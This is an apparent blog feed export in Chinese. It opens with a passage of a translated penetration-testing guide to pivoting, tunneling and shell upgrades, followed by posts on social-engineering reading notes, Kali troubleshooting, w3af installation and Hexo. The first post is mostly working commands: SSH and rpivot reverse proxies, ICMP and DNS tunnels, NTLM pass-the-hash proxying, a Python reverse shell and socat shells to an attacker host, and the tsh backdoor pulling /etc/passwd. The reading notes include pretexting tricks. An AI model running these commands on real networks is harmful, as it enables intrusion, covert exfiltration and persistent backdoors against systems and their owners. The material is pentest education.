NAT场景这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。 SSH反向端口转发/w 3proxy这个跳板设置看起来像这样：在目标服务器上使用以下配置运行3proxy服务：1socks -p31337 在接收方（攻击者的机器）上创建一个单独的用户。1adduser sshproxy 这个用户必须是低权限的，不应该有shell权限。毕竟，你不想被反向渗透，你呢？:)编辑/etc/passwd并将shell切换到/bin/false。它应该是这样的：1234root:x:0:0:root:/root:/bin/bash...sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false... 现在使用-R标志连接到新创建的用户的服务器。Linux系统：1ssh sshproxy@your_server -R 31337:127.0.0.1:31337 对于Windows，你将需要首先上传plink.exe。这是一个putty的控制台版本。运行它：1plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337 -R标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行3proxy socks服务（受感染的机器）并通过ssh-R标志访问攻击者主机上的这个端口。 Rpivot这是我最喜欢穿越NAT连接的方法。Rpivot是一个反向socks代理工具，可以让你通过socks代理隧道化流量。它连接回你的机器，并绑定一个socks代理。它的工作方式与ssh -D很像，但方向相反。服务器端：1python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0 客户端：1python client.py --server-ip &lt;ip&gt; --server-port 9999 结果，一个socks4代理服务将被绑定在服务器端的1080端口。 从内部网络泄漏这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。 ICMP隧道如果icmp流量被允许到外部网络，那么很可能你可以建立一个icmp隧道。缺点是你需要在目标系统上拥有root/administrator权限，因为有必要使用原始套接字。检查这个工具 - http://code.gerade.org/hans/ 。我个人从来没有尝试过在Windows上运行它。它在Linux上非常有效。服务器端命令（攻击者的机器）：1./hans -v -f -s 1.1.1.1 -p P@ssw0rd -v标志是详细的，-f标志在前台运行，-s标志的值是服务器在新创建的tun接口上的ip。客户端：1./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v 连接成功后，客户端应该可以直接在1.1.1.100处看到：123# ping 1.1.1.100PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms 现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。 DNS隧道如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。这个手册可能会帮助你设置你的名称服务器。 Iodine如果发生这种情况，并且在服务器上获得了root访问权限，你可以试试iodine。它几乎像hans icmp隧道工具一样工作 - 它创建了一对tun适配器，并将它们之间的数据作为DNS查询进行隧道传输。服务器端：1iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com 客户端：1iodine -f -P P@ssw0rd tunneldomain.com -r 连接成功将在地址1.1.1.2处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过递归DNS查询建立C＆C通道。这个工具不需要root/administrator权限（在windows和linux上都可以）。它也支持端口转发。服务器端：1ruby ./dnscat2.rb tunneldomain.com 客户端：1./dnscat2 tunneldomain.com 在收到服务器端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择带有session -i &lt;num&gt;的命令会话：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as'ping'! For a full list of clients, try 'help'.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发一个端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定攻击者机器上的8080端口，并将所有连接转发到10.0.0.20:80。 公司的HTTP代理作为一种出路HTTP代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;） Rpivot我已经在NAT穿越部分提到了这个工具。它还支持通过NTLM HTTP代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：123python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --password P@ssw0rd 或者如果你有LM:NT哈希而不是密码：123python client.py --server-ip &lt;rpivot_server_ip&gt;\--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45 CntlmCntlm是通过NTLM代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口443（这个端口是最有可能被允许通过代理的）：12345Username AlicePassword P@ssw0rdDomain CONTOSO.COMProxy 10.0.0.10:8080Tunnel 2222:&lt;attackers_machine&gt;:443 运行：1cntlm.exe -c config.conf 或者如果你在Linux上：1./cntlm -c config.conf 现在，假设你已经在远程主机的443端口上运行ssh，你可以启动ssh客户端（openssh/putty）并连接到本地端口2222来访问外部机器。 通过HTTP代理的OpenVpnOpenVpn是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过NTLM代理的隧道TCP连接。将此行添加到你的配置文件中：1http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm 凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要root。 利用带有proxychains的SOCKS如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用proxychains来强制你的程序通过socks代理。编辑/etc/proxychains.conf中的代理服务器：12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 3128 准备好了，只需在你最喜欢的pwn工具上添加proxychains：1proxychains program_name 与proxychains一起使用的impacket’s psexec.py： DNS与proxychainsProxychains在解析主机名时不遵循socks RFC。它拦截gethostbyname libc调用并通过socks代理隧道化tcp DNS请求。事情是，DNS服务器硬编码到4.2.2.2。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试Windows环境，将名称服务器更改为域控制器。该设置位于/usr/lib/proxychains3/proxyresolv：123456789101112#!/bin/sh# This script is called by proxychains to resolve DNS names# DNS server used to resolve namesDNS_SERVER=$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125; #change nameserver hereif [ $# = 0 ] ; then echo " usage:" echo " proxyresolv &lt;hostname&gt; " exitfi 美化你的web shell这部分内容与pivoting或tunneling没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用web-shell非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给sudo/su或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将web-shell升级到一个交互式shell时，我这样做:)我不会介绍像使用bash/perl/python等启动半交互式shell。有很多关于这样做的信息。看看这个反向shell备忘单 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 。 Python PTY shell从常规的半交互式shell升级。你可以在现有的shell中执行以下命令：1python -c 'import pty; pty.spawn("/bin/bash")' 或者启动反向连接：1234python -c 'import socket,subprocess,os;\s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' SocatNetcat的加强版！可是说实话，去检查这个工具的手册man socat，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的shell，甚至比前面提到的python-pty更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类Unix发行版中的默认工具。 绑定shell设置监听器：1socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane 连接到监听器：1socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337 反向shell：设置监听器：1socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0 连接到攻击者的机器：1socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane 终端大小默认情况下，终端的大小是相当小的，当启动top命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用stty -a命令来获得你的常规终端的大小：12$ stty -aspeed 38400 baud; rows 57; columns 211; line = 0; 将所需的尺寸应用到你的socat终端：1$ stty rows 57 cols 211 TshTsh是一个小型的ssh式后门，带有完整的pty终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类Unix系统上编译。从编辑tsh.h文件开始：12345678910111213141516#ifndef _TSH_H#define _TSH_Hchar *secret = "never say never say die";#define SERVER_PORT 22short int server_port = SERVER_PORT;/*#define CONNECT_BACK_HOST "localhost"#define CONNECT_BACK_DELAY 30*/#define GET_FILE 1#define PUT_FILE 2#define RUNSHELL 3#endif /* tsh.h */ 更改secret，指定SERVER_PORT。如果你想反向连接，取消注释并编辑CONNECT_BACK_HOST和CONNECT_BACK_DELAY指令。运行make：12345678910111213141516$ make linux_x64make \ LDFLAGS=" -Xlinker --no-as-needed -lutil" \ DEFS=" -DLINUX" \ tsh tshdmake[1]: Entering directory '/tmp/tsh'gcc -O3 -W -Wall -DLINUX -c pel.cgcc -O3 -W -Wall -DLINUX -c aes.cgcc -O3 -W -Wall -DLINUX -c sha1.cgcc -O3 -W -Wall -DLINUX -c tsh.cgcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.ostrip tshgcc -O3 -W -Wall -DLINUX -c tshd.cgcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.ostrip tshdmake[1]: Leaving directory '/tmp/tsh' 现在在服务器上运行./tshd。它将开始监听指定的端口。您可以通过执行以下命令连接到它：1./tsh host_ip 如果tsh被编译有反向连接功能，tshd守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：12$ ./tsh cbWaiting for the server to connect... 用tsh传输文件：12./tsh host_ip get /etc/passwd ../tsh host_ip put /bin/netcat /tmp]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《欺骗的艺术》读书笔记]]></title>
    <url>%2F2017%2F12%2F05%2Fthe-art-of-deception%2F</url>
    <content type="text"><![CDATA[人的因素是安全过程中最薄弱的环节。 你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。 把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。 不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。 两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。 安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。 执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。 每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。 逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。 新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。 第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali持久加密USB安装所遇问题总结]]></title>
    <url>%2F2017%2F12%2F04%2Fkali-live-usb-bug%2F</url>
    <content type="text"><![CDATA[Writing superblocks and filesystem accounting information今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用mkfs.ext4格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用dmesg命令诊断故障时发现如下错误：123...device descriptor read/8, error -110... 经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以讲U盘和虚拟机之间的连接改为2.0即可解决这个问题。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit中shell中文乱码解决方案]]></title>
    <url>%2F2017%2F12%2F04%2Fmetasploit-luanma%2F</url>
    <content type="text"><![CDATA[有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。解决方法： 在shell窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出 接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可注意： 这个设置会随着操作系统的重启而失效 设定简体中文编码之后，Linux中的中文字符就会乱码，因为Linux使用UTF-8编码 建议只在需要的时候设定简体中文编码]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017更新后无法启动解决方案]]></title>
    <url>%2F2017%2F11%2F25%2Fkali-update-bug%2F</url>
    <content type="text"><![CDATA[BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)有时更新Kali后重新启动会出现如下显示，并无法进入系统界面1234BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)Enter 'help' for a list of built-in commands.(initramfs) 解决方法： 在此界面输入blkid命令，查看自己的分区号 依据自己的分区号输入fsck -y /dev/sda1，我的分区号是sda1。 输入exit命令退出重启电脑]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017下安装w3af出错解决方案]]></title>
    <url>%2F2017%2F11%2F08%2Fkali-w3af-bug%2F</url>
    <content type="text"><![CDATA[Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”解决方法1：修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉1234#SSL_ST_INIT = _lib.SSL_ST_INIT#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE#SSL_ST_OK = _lib.SSL_ST_OK#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE 解决方法2： 卸载w3af要求的pyOpenSSL版本 1$ pip uninstall pyOpenSSL 安装最新版pyOpenSSL 1$ pip install pyOpenSSL 编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码 1PIPDependency('OpenSSL', 'pyOpenSSL', 'Version of pyOpenSSL you are using') error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1解决方法：使用如下命令安装相关依赖12$ apt-get build-dep python-lxml$ apt-get install libxslt-dev libssl-dev ImportError: No module named webkit启动GUI界面时可能会报此错误，原因是未安装相关模块解决方法：执行如下命令1$ apt-get install python-webkit python-webkit-dev 在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令1234567$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb$ dpkg -i python-support_1.0.15_all.deb$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb$ dpkg -i python-webkit_1.1.8-3_amd64.deb$ apt install python-gtk2-dev$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb$ dpkg -i python-webkit-dev_1.1.8-3_all.deb 安装过程中可能需要安装相关依赖，可执行如下命令1$ apt --fix-broken install ImportError: No module named gtksourceview2同样，启动GUI时也可能报此错误解决方法：执行如下命令1$ apt-get install python-gtksourceview2]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo初体验]]></title>
    <url>%2F2017%2F06%2F20%2Fhexo-experience%2F</url>
    <content type="text"><![CDATA[Hexo是一个基于Node.js的开源静态博客框架，类似的项目还有基于Ruby的Jekyll，基于Go的Hugo，基于Python的Pelican等等。 安装安装Hexo前，需要安装Node.js和Git，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入node -v来测试Node.js是否成功安装，输入npm -v来测试npm是否成功安装。npm成功安装后，可使用npm install -g hexo-cli来快速安装Hexo命令行工具。参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于： 本地安装 将安装包放在 ./node_modules 下（运行npm时所在的目录） 可以通过 require() 来引入本地安装的包 全局安装 将安装包放在 /usr/local下 可以直接在命令行里使用 关于npm更多的内容请参考npm模块安装机制简介。 更新在博客所在目录执行npm update -g即可更新Hexo。 常用命令新建一个网站1$ hexo init [folder] 如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。 新建一篇文章1$ hexo n [layout] &lt;title&gt; 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 生成静态文件1$ hexo g 启动服务预览1$ hexo s 部署网站1$ hexo d 清除缓存文件(db.json)和已生成的静态文件(public)。1$ hexo clean 在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。 更多目录结构在Hexo生成的网站目录中，public目录保存着已经生成的静态文件，source目录保存着markdown格式的源文件，themes目录保存着主题文件，_config.yml文件为站点配置文件。 关于Hexo的更多问题，请参考Hexo官方文档，关于NexT主题的更多问题，请参考NexT使用文档，关于如何利用Hexo以及GitHub Pages搭建个人博客的更详细内容，请参考GitHub + Hexo 搭建个人网站详细教程。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
